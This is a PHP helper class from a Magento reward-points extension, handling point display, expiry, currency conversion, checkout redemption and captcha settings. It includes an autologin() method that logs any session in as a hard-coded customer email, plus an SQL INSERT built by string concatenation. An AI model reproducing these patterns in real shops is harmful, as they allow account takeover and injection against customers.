<?php
    class MW_RewardPoints_Helper_Data extends Mage_Core_Helper_Abstract
    {
        const MYCONFIG = "rewardpoints/config/enabled";
        const MYNAME   = "MW_RewardPoints";

        protected function _getSession()
        {
            return Mage::getSingleton('core/session');
        }

        public function myConfig()
        {
            return self::MYCONFIG;
        }

        function disableConfig()
        {
            Mage::getSingleton('core/config')->saveConfig($this->myConfig(), 0);
            Mage::getModel('core/config')->saveConfig("advanced/modules_disable_output/" . self::MYNAME, 1);
            Mage::getConfig()->reinit();
        }

        public function getInvitationTemplate()
        {
            return Mage::app()->getLayout()->createBlock('core/template')->setTemplate('mw_rewardpoints/customer/account/invitation/invite_form_ajax.phtml')->toHtml();
        }

        public function getLink(Mage_Customer_Model_Customer $customer)
        {
            $url = Mage::getBaseUrl();

            return trim($url) . "?mw_reward=" . md5($customer->getEmail());
        }

        public function getLinkAjax(Mage_Customer_Model_Customer $customer, $link)
        {
            return trim($link) . "?mw_reward=" . md5($customer->getEmail());
        }

        public function autologin()
        {
            $customer = Mage::getModel('customer/customer')->setWebsiteId(Mage::app()->getStore()->getWebsiteId());
            $customer = $customer->loadByEmail('phuoctha@gmail.com');
            Mage::getSingleton('customer/session')->logout();
            Mage::getSingleton('customer/session')->setCustomerAsLoggedIn($customer);
        }

        public function processExpiredPointsWhenSpentPoints($customer_id, $points)
        {
            $array_add_point         = Mage::getModel('rewardpoints/type')->getAddPointArray();
            $transaction_collections = Mage::getModel('rewardpoints/rewardpointshistory')->getCollection()
                ->addFieldToFilter('customer_id', $customer_id)
                ->addFieldToFilter('type_of_transaction', array('in' => array($array_add_point)))
                ->addFieldToFilter('status', MW_RewardPoints_Model_Status::COMPLETE)
                ->addFieldToFilter('expired_time', array('neq' => null))
                ->addFieldToFilter('point_remaining', array('gt' => 0))
                ->setOrder('expired_time', 'ASC')
                ->setOrder('history_id', 'ASC');

            foreach ($transaction_collections as $transaction_collection)
            {

                $point_remaining = (int)$transaction_collection->getPointRemaining();
                if($point_remaining >= $points)
                {
                    $transaction_collection->setPointRemaining($point_remaining - $points)->save();
                    break;
                }
                else if($point_remaining < $points)
                {
                    $transaction_collection->setPointRemaining(0)->save();
                    $points = $points - $point_remaining;
                }

            }

        }

        public function getTransactionByExpiredDayAndPoints($earn_rewardpoint, $expired_day)
        {
            $results         = array();
            $expired_time    = null;
            $point_remaining = 0;
            if($expired_day > 0)
            {
                $expired_time    = time() + $expired_day * 24 * 3600;
                $point_remaining = $earn_rewardpoint;
            }
            $results[0] = $expired_time;
            $results[1] = $point_remaining;

            return $results;
        }

        public function getTransactionExpiredPoints($earn_rewardpoint, $store_id)
        {
            $results         = array();
            $expired_day     = 0;
            $expired_time    = null;
            $point_remaining = 0;
            $expired_day     = (int)$this->getExpirationDaysPoint($store_id);
            if($expired_day > 0)
            {
                $expired_time    = time() + $expired_day * 24 * 3600;
                $point_remaining = $earn_rewardpoint;
            }

            $results[0] = $expired_day;
            $results[1] = $expired_time;
            $results[2] = $point_remaining;

            return $results;
        }

        public function getInvitationModule()
        {
            return true;
            /*
            $modules = array_keys((array)Mage::getConfig()->getNode('modules')->children());
            if(in_array('MW_Invitation',$modules)) return true;
            return false;
            */
        }

        public function getCreditModule()
        {
            $modules = array_keys((array)Mage::getConfig()->getNode('modules')->children());
            if(in_array('MW_Credit', $modules))
            {
                if(Mage::getStoreConfig('credit/config/enabled'))
                {
                    return true;
                }
            }

            return false;
        }

        public function getDisplayEarnpointMiniCart()
        {
            $store_id        = Mage::app()->getStore()->getId();
            $quote           = Mage::getSingleton('checkout/session')->getQuote();
            $mw_reward_point = (int)$quote->getEarnRewardpoint();
            $enable          = $this->moduleEnabled();
            $reward_icon     = $this->getRewardIconHtml($store_id);
            if($mw_reward_point > 0 && $enable)
            {
                return '<span class="mw_display_point">' . $reward_icon . $this->__("You will earn <b>%s</b>", $this->formatPoints($mw_reward_point, $store_id)) . '</span>';
            }

            return '';
        }

        public function getDisplayEarnpointCreateAccount()
        {
            $store_id            = Mage::app()->getStore()->getId();
            $customer_group_id   = Mage::helper('rewardpoints/data')->getCustomerGroupIdFontend();
            $type_of_transaction = MW_RewardPoints_Model_Type::REGISTERING;
            $mw_reward_point     = (int)Mage::getModel('rewardpoints/activerules')->getPointActiveRules($type_of_transaction, $customer_group_id);

            $enable      = $this->moduleEnabled();
            $reward_icon = $this->getRewardIconHtml($store_id);
            if($mw_reward_point > 0 && $enable)
            {
                return '<span class="mw_display_point">' . $reward_icon . $this->__("Earn <b>%s</b> for creating new account.", $this->formatPoints($mw_reward_point, $store_id)) . '</span>';
            }

            return '';
        }

        public function getDisplayEarnpointSignUpNewLetter()
        {
            $store_id            = Mage::app()->getStore()->getId();
            $customer_group_id   = Mage::helper('rewardpoints/data')->getCustomerGroupIdFontend();
            $type_of_transaction = MW_RewardPoints_Model_Type::SIGNING_UP_NEWLETTER;
            $mw_reward_point     = (int)Mage::getModel('rewardpoints/activerules')->getPointActiveRules($type_of_transaction, $customer_group_id);

            $reward_icon = $this->getRewardIconHtml($store_id);
            $enable      = $this->moduleEnabled();
            if($mw_reward_point > 0 && $enable)
            {
                return '<span class="mw_display_point">' . $reward_icon . $this->__("Earn <b>%s</b> when you signing up newletter.", $this->formatPoints($mw_reward_point, $store_id)) . '</span>';
            }

            return '';
        }

        public function getDisplayEarnpointSubmitProductReview()
        {
            $store_id            = Mage::app()->getStore()->getId();
            $customer_group_id   = Mage::helper('rewardpoints/data')->getCustomerGroupIdFontend();
            $type_of_transaction = MW_RewardPoints_Model_Type::SUBMIT_PRODUCT_REVIEW;
            $mw_reward_point     = (int)Mage::getModel('rewardpoints/activerules')->getPointActiveRules($type_of_transaction, $customer_group_id);

            $reward_icon = $this->getRewardIconHtml($store_id);
            $enable      = $this->moduleEnabled();
            if($mw_reward_point > 0)
            {
                return '<span class="mw_display_point">' . $reward_icon . $this->__("Earn <b>%s</b> when you submit product review.", $this->formatPoints($mw_reward_point, $store_id)) . '</span>';
            }

            return '';
        }

        public function getDisplayEarnpointSubmitPoll()
        {
            $store_id            = Mage::app()->getStore()->getId();
            $customer_group_id   = Mage::helper('rewardpoints/data')->getCustomerGroupIdFontend();
            $type_of_transaction = MW_RewardPoints_Model_Type::SUBMIT_POLL;
            $mw_reward_point     = (int)Mage::getModel('rewardpoints/activerules')->getPointActiveRules($type_of_transaction, $customer_group_id);

            $reward_icon = $this->getRewardIconHtml($store_id);
            $enable      = $this->moduleEnabled();
            if($mw_reward_point > 0 && $enable)
            {
                return '<span class="mw_display_point">' . $reward_icon . $this->__("Earn <b>%s</b> when you submit poll.", $this->formatPoints($mw_reward_point, $store_id)) . '</span>';
            }

            return '';
        }

        public function getDisplayEarnpointListProduct($_product)
        {
            $store_id        = Mage::app()->getStore()->getId();
            $mw_reward_point = Mage::getModel('rewardpoints/catalogrules')->getPointCatalogRulue($_product->getId());
            if($_product->getTypeId() == 'configurable')
            {
                $model            = Mage::getModel('rewardpoints/productsellpoint');
                $collection = $model->getCollection()
                    ->addFieldToFilter('product_id', $_product->getId())
                    ->addExpressionFieldToSelect('min_earn_point', 'MIN(earn_point)', array());
                $collection->getSelect()->group('option_type_id');

                $total_min_point = 0;
                foreach($collection->getData() as $point)
                {
                    $total_min_point += $point['min_earn_point'];
                }

                $mw_reward_point += $total_min_point;
            }

            $reward_icon = $this->getRewardIconHtml($store_id);
            $enable      = $this->moduleEnabled();
            if($mw_reward_point > 0 && $enable)
            {
                return '<span class="mw_display_point">' .
                $reward_icon . $this->__("Earn <b>%s</b>", $this->formatPoints($mw_reward_point, $store_id)) .
                '</span>';
            }

            return '';
        }

        public function getDisplayEarnpointViewProduct($_product)
        {

            $store_id        = Mage::app()->getStore()->getId();
            $mw_reward_point = Mage::getModel('rewardpoints/catalogrules')->getPointCatalogRulue($_product->getId());

            $reward_icon = $this->getRewardIconHtml($store_id);
            $enable      = $this->moduleEnabled();
            if($mw_reward_point >= 0 && $enable)
            {
                $hidden = '<input type="hidden" name="mw_inp_earn_point" value="' . $mw_reward_point . '">';

                return '<span class="mw_display_point ' . (!$mw_reward_point ? 'hide' : 'show') . '">' .
                $hidden . $reward_icon . $this->__("You will earn <b>%s</b> for buying this product.", $this->formatPoints($mw_reward_point, $store_id)) .
                '</span>';
            }

            return '';
        }

        public function getRewardpointCartTemplate()
        {
            $enable = $this->moduleEnabled();
            if($enable)
            {
                return Mage::app()->getLayout()->createBlock('rewardpoints/checkout_cart_rewardpoints')->setTemplate('mw_rewardpoints/checkout/cart/rewardpoints.phtml')->toHtml();
            }
            else
            {
                return '';
            }
        }

        public function getRewardpointOnepageTemplate()
        {
            $enable = $this->moduleEnabled();
            if($enable)
            {
                if($this->isOSCRunning())
                {
                    return Mage::app()->getLayout()->createBlock('rewardpoints/checkout_cart_rewardpoints')->setTemplate('mw_rewardpoints/checkout/onepage/rewardpoints_osc.phtml')->toHtml();
                }
                else
                {
                    return Mage::app()->getLayout()->createBlock('rewardpoints/checkout_cart_rewardpoints')->setTemplate('mw_rewardpoints/checkout/onepage/rewardpoints.phtml')->toHtml();
                }
            }
            else
            {
                return '';
            }
        }

        public function getRewardpointOnepageReviewTemplate()
        {
            $enable = $this->moduleEnabled();
            if($enable)
            {
                return Mage::app()->getLayout()->createBlock('core/template')->setTemplate('mw_rewardpoints/checkout/onepage/review/totals/rewardpoints.phtml')->toHtml();
            }
            else
            {
                return '';
            }
        }

        public function getTotalSpentPointOnepageReviewTemplate()
        {
            $enable = $this->moduleEnabled();
            if($enable)
            {
                return Mage::app()->getLayout()->createBlock('core/template')->setTemplate('mw_rewardpoints/checkout/onepage/review/totals/spentpoints.phtml')->toHtml();
            }
            else
            {
                return '';
            }
        }

        public function getCustomerGroupIdFontend()
        {
            $group_id = 0;
            $login    = Mage::getSingleton('customer/session')->isLoggedIn();
            if($login)
            {
                $group_id = (int)Mage::getSingleton('customer/session')->getCustomerGroupId();

            }

            return $group_id;
        }

        public function getPointCurency($store_id)
        {
            return trim(Mage::getStoreConfig('rewardpoints/display/point_curency', $store_id));
        }

        public function getEnableShowCreditInfo($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/show_credit_info', $store_id);
        }

        public function getEnablePointCurrencyImage($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/enable_image', $store_id);
        }

        public function getPointCurrencyImage($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/point_curency_image', $store_id);
        }

        public function getPointCurrencyImageSize($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/image_size', $store_id);
        }

        public function getEnablePromotionMessage($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/enable_message', $store_id);
        }

        public function getEnablePromotionBanner($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/enable_banner', $store_id);
        }

        public function getPromtionBannerSize($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/banner_size', $store_id);
        }

        public function getRewardIcon($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/reward_icon', $store_id);
        }

        public function getLinkRewardIconTo($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/link_reward_icon_to', $store_id);
        }

        public function getRewardIconHtml($store_id)
        {
            $image_reward_icon = '';
            $image_reward_icon = $this->getRewardIcon($store_id);
            if($image_reward_icon == '')
            {
                $image_reward_icon = 'reward_icon.gif';
            }
            $link_reward_icon = '';
            $link_reward_icon = $this->getLinkRewardIconTo($store_id);
            $reward_icon      = '<a style = "float: left; margin-right: 5px;" href="' . $link_reward_icon . '" target="_blank">
							<span><img style ="vertical-align: middle;" alt="Reward Points Policy" src="' . Mage::getBaseUrl('media') . 'mw_rewardpoint/' . $image_reward_icon . '"></span>
						</a>';

            return $reward_icon;
        }

        public function getPointCustomerShowTop($_link)
        {
            $store_id = Mage::app()->getStore()->getId();
            $enable   = $this->moduleEnabled();
            if(strpos($_link->getUrl(), 'customer/account') == true && strpos($_link->getUrl(), 'customer/account/login') == false && strpos($_link->getUrl(), 'customer/account/logout') == false)
            {
                $customer_id = Mage::getSingleton('customer/session')->getCustomer()->getId();
                if($customer_id && $enable)
                {
                    $collection_customers = Mage::getModel('rewardpoints/customer')->getCollection()
                        ->addFieldToFilter('customer_id', $customer_id);
                    if(sizeof($collection_customers) > 0)
                    {
                        foreach ($collection_customers as $collection_customer)
                        {
                            if($collection_customer->getMwRewardPoint() > 0)
                            {
                                return '<span style="color:yellow"> (<a href="' . Mage::getUrl("rewardpoints/rewardpoints") . '" style="color:yellow">' . $this->formatPoints($collection_customer->getMwRewardPoint(), $store_id) . '</a>)</span>';
                            }
                            //return '<a href="'.Mage::getUrl("rewardpoints/rewardpoints").'" style="color:yellow"> ('.$this->formatPoints($collection_customer->getMwRewardPoint(),$store_id).')</a>';
                            else
                            {
                                return '';
                            }
                            break;
                        }
                    }

                    return '';
                }
            }

            return '';

        }

        public function getPointCustomerShowMyAccount($_link)
        {
            $store_id = Mage::app()->getStore()->getId();
            $enable   = $this->moduleEnabled();
            if($_link->getName() == 'reward_points' && $enable)
            {
                $customer_id = Mage::getSingleton('customer/session')->getCustomer()->getId();
                if($customer_id)
                {
                    $collection_customers = Mage::getModel('rewardpoints/customer')->getCollection()
                        ->addFieldToFilter('customer_id', $customer_id);
                    if(sizeof($collection_customers) > 0)
                    {
                        foreach ($collection_customers as $collection_customer)
                        {
                            if($collection_customer->getMwRewardPoint() > 0)
                            {
                                return ' (' . $this->formatPoints($collection_customer->getMwRewardPoint(), $store_id) . ')';
                            }
                            else
                            {
                                return '(0)';
                            }
                            break;
                        }
                    }

                    return '(0)';
                }

                return '(0)';
            }

            return '';

        }

        public function getCustomerPoint()
        {
            $store_id = Mage::app()->getStore()->getId();
            $enable   = $this->moduleEnabled();
            $customer_id = Mage::getSingleton('customer/session')->getCustomer()->getId();
            if($customer_id && $enable)
            {
                $collection_customers = Mage::getModel('rewardpoints/customer')->getCollection()
                    ->addFieldToFilter('customer_id', $customer_id);
                if(sizeof($collection_customers) > 0)
                {
                    foreach ($collection_customers as $collection_customer)
                    {
                        if($collection_customer->getMwRewardPoint() > 0)
                        {
                            return '<span> (' . $this->formatPoints($collection_customer->getMwRewardPoint(), $store_id) . ')</span>';
                        }
                        else
                        {
                            return '';
                        }
                        break;
                    }
                }

                return '';
            }

            return '';

        }

        public function formatPoints($points, $store_id)
        {
            $position             = Mage::getStoreConfig('rewardpoints/display/curency_position', $store_id);
            $_points              = number_format($points, 0, '.', ',');
            $enable_curency_image = (int)$this->getEnablePointCurrencyImage($store_id);

            $money = '';
            if($this->getEnableShowCreditInfo($store_id))
            {
                $money = ' (' . $this->formatMoney(Mage::helper('rewardpoints')->exchangePointsToMoneys($points, $store_id)) . ')';
            }
            if($enable_curency_image)
            {
                $mw_image = '';
                $mw_image = $this->getPointCurrencyImage($store_id);
                if($mw_image == '')
                {
                    $mw_image = 'mw_money.png';
                }
                if($position == MW_RewardPoints_Model_Position::BEFORE)
                {
                    return '<span class="mw_rewardpoints"><img src="' . Mage::getBaseUrl('media') . 'mw_rewardpoint/' . $mw_image . '" alt="Reward points" style="vertical-align: middle"> ' . " " . $_points . $money . '</span>';
                }

                return '<span class="mw_rewardpoints">' . $_points . " " . '<img src="' . Mage::getBaseUrl('media') . 'mw_rewardpoint/' . $mw_image . '" alt="Reward points" style="vertical-align: middle">' . $money . '</span>';
            }
            if($position == MW_RewardPoints_Model_Position::BEFORE)
            {
                return '<span class="mw_rewardpoints">' . $this->getPointCurency($store_id) . " " . $_points . $money . '</span>';
            }

            return '<span class="mw_rewardpoints">' . $_points . " " . $this->getPointCurency($store_id) . $money . '</span>';
        }

        public function checkAndInsertCustomerId($customer_id, $friend_id)
        {
            if($customer_id)
            {
                $collection_customer = Mage::getModel('rewardpoints/customer')->getCollection()
                    ->addFieldToFilter('customer_id', $customer_id);
                if(sizeof($collection_customer) == 0)
                {
                    $_customer_table = Mage::getModel('rewardpoints/customer')->getCollection();
                    $write           = Mage::getSingleton('core/resource')->getConnection('core_write');
                    $sql             = 'INSERT INTO ' . $_customer_table->getTable('customer') . '(customer_id,mw_reward_point,mw_friend_id) VALUES(' . $customer_id . ',0,' . (($friend_id) ? $friend_id : 0) . ')';
                    $write->query($sql);
                }
            }
        }

        public function sizeofTransactionHistory($customer_id, $type, $transaction_detail = null, $status = null)
        {
            $collection_customer = Mage::getModel('rewardpoints/rewardpointshistory')->getCollection()
                ->addFieldToFilter('customer_id', $customer_id)
                ->addFieldToFilter('type_of_transaction', $type);

            if($transaction_detail != null)
            {
                $collection_customer->addFieldToFilter('transaction_detail', $transaction_detail);
            }
            if($status != null)
            {
                $collection_customer->addFieldToFilter('status', $status);
            }

            return (int)sizeof($collection_customer);

        }

        public function checkCustomerMaxBalance($customer_id, $store_id, $pointAdd = 0)

        {
            $max = (int)$this->getMaxPointBanceStore($store_id);

            if($customer_id == 0)
            {
                return false;
            }
            if($max)
            {
                $point = (int)Mage::getModel('rewardpoints/customer')->load($customer_id)->getMwRewardPoint();
                if(($point + $pointAdd) >= $max)
                {
                    return false;
                }

            };

            return true;

        }

        public function getCouponRwpConfig($store_id)
        {
            return (int)Mage::getStoreConfig('rewardpoints/config/using_coupon_rwp', $store_id);
        }

        public function getCheckoutSession()
        {
            return Mage::getSingleton('checkout/session');
        }

        public function getCurrentCustomer()
        {
            return Mage::getSingleton('customer/session')->getCustomer();
        }

        public function moduleEnabled()
        {
            return Mage::getStoreConfig('rewardpoints/config/enabled');
        }

        public function formatMoney($money, $format = true, $includeContainer = true)
        {
            return Mage::helper('core')->currency($money, $format, $includeContainer);
        }

        public function exchangePointsToMoneys($rewardpoints, $store_id = null)
        {
            if($rewardpoints < 0)
            {
                return 0;
            }
            $rate  = $this->getPointMoneyRateConfig($store_id);
            $rate  = explode('/', $rate);
            $money = ($rewardpoints * 1.0 * $rate[1]) / $rate[0];

            return round($money, 2);
        }

        public function exchangeMoneysToPoints($money, $store_id = null)
        {
            if($money < 0)
            {
                return 0;
            }
            $rate   = $this->getPointMoneyRateConfig($store_id);
            $rate   = explode('/', $rate);
            $points = (($money * 1.0 * $rate[0]) / $rate[1]);

            return ceil($points);
        }

        public function getAppyRewardPoints($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/appy_reward_point', $store_id);
        }

        public function getAppyRewardPointsTax($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/appy_reward_point_tax', $store_id);
        }

        public function getRedeemPointsOnTax($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/redeem_point_on_tax', $store_id);
        }

        public function getRedeemedTaxConfig($store_id)
        {
            return (int)Mage::getStoreConfig('rewardpoints/config/redeemed_tax', $store_id);
        }

        public function getRedeemedShippingConfig($store_id)
        {
            return (int)Mage::getStoreConfig('rewardpoints/config/redeemed_shipping', $store_id);
        }

        public function getPointMoneyRateConfig($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/point_money_rate', $store_id);
        }

        public function getPointStepConfig($store_id)
        {
            return (int)Mage::getStoreConfig('rewardpoints/config/point_step', $store_id);
        }

        public function getMinPointCheckoutStore($store_id)
        {
            $min = (int)Mage::getStoreConfig('rewardpoints/config/min_checkout', $store_id);
            if($min == '')
            {
                $min = 0;
            }

            return $min;
        }

        public function getMaxPointBanceStore($store_id)
        {
            $max = (int)Mage::getStoreConfig('rewardpoints/config/max_point_balance', $store_id);
            if($max == '')
            {
                $max = 0;
            }

            return $max;
        }

        public function getStatusAddRewardPointStore($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/status_add_reward_point', $store_id);
        }

        public function getStatusSubtractRewardPointStore($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/status_subtract_reward_point', $store_id);
        }

        public function getSubtractPointWhenRefundConfigStore($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/subtract_reward_point', $store_id);
        }

        public function getRestoreSpentPointsWhenRefundConfigStore($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/restore_spent_points', $store_id);
        }

        public function getEnableProductRewardPointStore($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/enabled_product_reward_point', $store_id);
        }

        public function getDefaultCommentConfig($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/default_comment', $store_id);
        }

        public function getExpirationDaysPoint($store_id)
        {
            $expired_day = 0;
            if(Mage::getStoreConfig('rewardpoints/config/expiration_days', $store_id) == '')
            {
                $expired_day = 0;
            }
            else
            {
                $expired_day = (int)Mage::getStoreConfig('rewardpoints/config/expiration_days', $store_id);
            }

            return $expired_day;
        }

        public function getExpirationDaysEmail($store_id)
        {
            $expired_day = 0;
            if(Mage::getStoreConfig('rewardpoints/email_notifications/expiration_days', $store_id) == '')
            {
                $expired_day = 0;
            }
            else
            {
                $expired_day = (int)Mage::getStoreConfig('rewardpoints/email_notifications/expiration_days', $store_id);
            }

            return $expired_day;
        }
		public function getAlertExpirationDaysEmail($store_id)
        {
            $expiration_alertdays = 0;
            if(Mage::getStoreConfig('rewardpoints/email_notifications/expiration_alertdays', $store_id) == '')
            {
                $expiration_alertdays = 0;
            }
            else
            {
                $expiration_alertdays = (int)Mage::getStoreConfig('rewardpoints/email_notifications/expiration_alertdays', $store_id);
            }

            return $expiration_alertdays;
        }

        public function getQtyCustomerRunCron($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/config/qty_customer', $store_id);
        }

        public function getEnableDisplayProductViewStore($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/display/product_view', $store_id);
        }

        public function getFacebookLikeEnable($store_id)
        {
            $store_id    = Mage::app()->getStore()->getId();
            $customer_id = Mage::getSingleton('customer/session')->getCustomer()->getId();
            if($customer_id)
            {
                $customer_group_id   = Mage::helper('rewardpoints/data')->getCustomerGroupIdFontend();
                $type_of_transaction = MW_RewardPoints_Model_Type::LIKE_FACEBOOK;
                $mw_reward_point     = (int)Mage::getModel('rewardpoints/activerules')->getPointActiveRules($type_of_transaction, $customer_group_id);
                if($mw_reward_point > 0)
                {
                    return true;
                }
            }

            return false;

        }

        public function getFacebookLikeType($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/facebook/type', $store_id);
        }

        public function getFacebookLikeSiteName($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/facebook/site_name', $store_id);
        }

        public function getFacebookLikeAppId($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/facebook/appid', $store_id);
        }

        public function getFacebookSend($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/facebook/send', $store_id);
        }

        public function getFacebookLikeLang($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/facebook/lang', $store_id);
        }

        public function getDisplayFacebookLike()
        {
            return Mage::app()->getLayout()->createBlock('rewardpoints/facebook_like')->setTemplate('mw_rewardpoints/facebook/likebutton.phtml')->toHtml();
        }

        public function setPointToCheckOut($rewardpoints, $quote = null, $customer_id = null, $store_id = null, $baseGrandTotal = null)
        {
            if(is_null($store_id))
            {
                $store_id = Mage::app()->getStore()->getId();
            }
            if(is_null($customer_id))
            {
                $customer_id = Mage::getSingleton('customer/session')->getCustomer()->getId();
            }
            if(is_null($quote))
            {
                $quote = Mage::getSingleton('checkout/session')->getQuote();
            }

            if($customer_id)
            {
                $_customer = Mage::getModel('rewardpoints/customer')->load($customer_id);

                if($quote->isVirtual())
                {
                    $address = $quote->getBillingAddress();
                }
                else
                {
                    $address = $quote->getShippingAddress();
                }

                if(is_null($baseGrandTotal))
                {
                    $baseGrandTotal = $quote->getBaseGrandTotal();
                }

                $maxPoints = $this->getMaxPointToCheckOut($quote, $customer_id, $store_id, $baseGrandTotal);

                $rewardpoint_discount       = (double)$quote->getMwRewardpointDiscount();
                $subtotal_after_rewardpoint = $baseGrandTotal + $rewardpoint_discount;

                $points = $this->exchangeMoneysToPoints($subtotal_after_rewardpoint, $store_id);

                $customerPoints = $_customer->getRewardPoint();
                $tmp            = 0;
                if($maxPoints)
                {
                    $tmp = $this->roundPoints($maxPoints, $store_id);
                }
                else
                {
                    $tmp = $this->roundPoints($points, $store_id);
                }
                if($rewardpoints <= $tmp && $rewardpoints <= $customerPoints)
                {
                    $minPoints = (float)Mage::getStoreConfig('rewardpoints/config/min_checkout');
                    if($rewardpoints >= $minPoints) {
                        $money = $this->exchangePointsToMoneys($rewardpoints, $store_id);
                        if($money > $subtotal_after_rewardpoint)
                        {
                            $money        = $subtotal_after_rewardpoint;
                            $rewardpoints = $this->exchangeMoneysToPoints($money, $store_id);
                            $rewardpoints = $this->roundPoints($rewardpoints, $store_id);
                        }
                        $money = round($money, 2);
                        $quote->setMwRewardpoint($rewardpoints)->setMwRewardpointDiscount($money)->save();
                        Mage::getSingleton('core/session')->setMwRewardpointAfterDrop($rewardpoints);
                    } else {
                        $quote->setMwRewardpoint(0)->setMwRewardpointDiscount(0)->save();
                        Mage::getSingleton('core/session')->setMwRewardpointAfterDrop(0);
                    }
                }
                // if($rewardpoints <= $tmp && $rewardpoints <= $customerPoints)
                // {
                //     $money = $this->exchangePointsToMoneys($rewardpoints, $store_id);
                //     if($money > $subtotal_after_rewardpoint)
                //     {
                //         $money        = $subtotal_after_rewardpoint;
                //         $rewardpoints = $this->exchangeMoneysToPoints($money, $store_id);
                //         $rewardpoints = $this->roundPoints($rewardpoints, $store_id);
                //     }
                //     $money = round($money, 2);
                //     $quote->setMwRewardpoint($rewardpoints)->setMwRewardpointDiscount($money)->save();
                //     Mage::getSingleton('core/session')->setMwRewardpointAfterDrop($rewardpoints);
                // }
            }
        }

        public function getMaxPointToCheckOut($quote = null, $customer_id = null, $store_id = null, $baseGrandTotal = null)
        {
            if(is_null($store_id))
            {
                $store_id = Mage::app()->getStore()->getId();
            }
            if(is_null($customer_id))
            {
                $customer_id = Mage::getSingleton('customer/session')->getCustomer()->getId();
            }
            if(is_null($quote))
            {
                $quote = Mage::getSingleton('checkout/session')->getQuote();
            }

            $maxPoints = $quote->getSpendRewardpointCart();
            if($quote->isVirtual())
            {
                $address = $quote->getBillingAddress();
            }
            else
            {
                $address = $quote->getShippingAddress();
            }
            //if($address->getBaseSubtotal() <=0) return 0;
            if(is_null($baseGrandTotal))
            {
                $baseGrandTotal = $quote->getBaseGrandTotal();
            }

            $points = $this->exchangeMoneysToPoints($baseGrandTotal + $quote->getMwRewardpointDiscount(), $store_id);

            $customerPoints = Mage::getModel('rewardpoints/customer')->load($customer_id)->getMwRewardPoint();

            $tmp = 0;
            if($maxPoints)
            {
                $tmp = $this->roundPoints($maxPoints, $store_id, true);

                if($customerPoints >= $maxPoints)
                {
                    //Mage::log('point'.$this->roundPoints($points,$store_id,true).' max pointssss'.$this->roundPoints($maxPoints,$store_id,true));
                    if($maxPoints < $points)
                    {
                        return $this->roundPoints($maxPoints, $store_id, true);
                    }

                    return $this->roundPoints($points, $store_id, true);
                }
                else
                {
                    if($customerPoints < $points)
                    {
                        return $this->roundPoints($customerPoints, $store_id, false);
                    }

                    return $this->roundPoints($points, $store_id, false);
                }
            }

            return 0;
        }

        public function allowSendRewardPointsToFriend($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/using_points/allow_send_reward_point_to_friend', $store_id);
        }

        public function timeLifeSendRewardPointsToFriend($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/using_points/time_life', $store_id);
        }

        public function enabledCapcha($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/capcha/capcha_enabled', $store_id);
        }

        public function getCapchaBackgroundImage($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/background_image', $store_id))
            {
                return Mage::getBaseDir('media') . DS . 'mw_rewardpoints' . DS . 'capcha' . DS . Mage::getStoreConfig('rewardpoints/capcha/background_image', $store_id);
            }

            return Mage::getDesign()->getSkinBaseDir(array()) . DS . 'mw_rewardpoints' . DS . 'backgrounds' . DS . 'bg3.jpg';
        }

        public function getCapchaBackgroundColor($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/image_bg_color', $store_id))
            {
                return "#" . Mage::getStoreConfig('rewardpoints/capcha/image_bg_color', $store_id);
            }

            return "#FFFFFF";
        }

        public function getCapchaImageWidth($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/image_width', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/image_width', $store_id);
            }

            return 255;
        }

        public function getCapchaImageHeight($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/image_height', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/image_height', $store_id);
            }

            return 50;
        }

        public function getCapchaPerturbation($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/perturbation', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/perturbation', $store_id);
            }

            return 0.7;
        }

        public function getCapchaCodeLength($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/code_length', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/code_length', $store_id);
            }

            return 7;
        }

        public function capchaUseTransparentText($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/use_transparent_text', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/use_transparent_text', $store_id);
            }

            return 1;
        }

        public function getCapchaTextTransparencyPercentage($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/text_transparency_percentage', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/text_transparency_percentage', $store_id);
            }

            return 0;
        }

        public function getCapchaNumberLine($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/capcha/num_lines', $store_id);
        }

        public function getCapchaTextColor($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/text_color', $store_id))
            {
                return "#" . Mage::getStoreConfig('rewardpoints/capcha/text_color', $store_id);
            }

            return '#FF7F27';
        }

